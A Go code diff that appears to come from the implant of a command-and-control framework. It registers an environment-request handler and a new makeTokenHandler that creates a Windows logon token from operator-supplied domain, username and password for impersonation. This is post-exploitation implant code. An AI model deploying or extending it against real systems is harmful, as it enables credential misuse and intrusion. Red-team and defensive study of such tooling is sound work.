@@ -50,6 +50,7 @@ var (
 		sliverpb.MsgStartServiceReq:    startService,
 		sliverpb.MsgStopServiceReq:     stopService,
 		sliverpb.MsgRemoveServiceReq:   removeService,
+		sliverpb.MsgEnvReq:             getEnvHandler,
 
 		// Generic
 		sliverpb.MsgPsReq:        psHandler,
@@ -67,8 +68,9 @@ var (
 
 		sliverpb.MsgScreenshotReq: screenshotHandler,
 
-		sliverpb.MsgSideloadReq: sideloadHandler,
-		sliverpb.MsgNetstatReq:  netstatHandler,
+		sliverpb.MsgSideloadReq:  sideloadHandler,
+		sliverpb.MsgNetstatReq:   netstatHandler,
+		sliverpb.MsgMakeTokenReq: makeTokenHandler,
 	}
 
 	windowsPivotHandlers = map[uint32]PivotHandler{
@@ -285,6 +287,23 @@ func namedPipeListenerHandler(envelope *sliverpb.Envelope, connection *transport
 		ID:   envelope.GetID(),
 		Data: data,
 	}
+}
+
+func makeTokenHandler(data []byte, resp RPCResponse) {
+	makeTokenReq := &sliverpb.MakeTokenReq{}
+	err := proto.Unmarshal(data, makeTokenReq)
+	if err != nil {
+		return
+	}
+	makeTokenResp := &sliverpb.MakeToken{}
+	err = priv.MakeToken(makeTokenReq.Domain, makeTokenReq.Username, makeTokenReq.Password)
+	if err != nil {
+		makeTokenResp.Response = &commonpb.Response{
+			Err: err.Error(),
+		}
+	}
+	data, err = proto.Marshal(makeTokenResp)
+	resp(data, err)
 }
 
 func startService(data []byte, resp RPCResponse) {
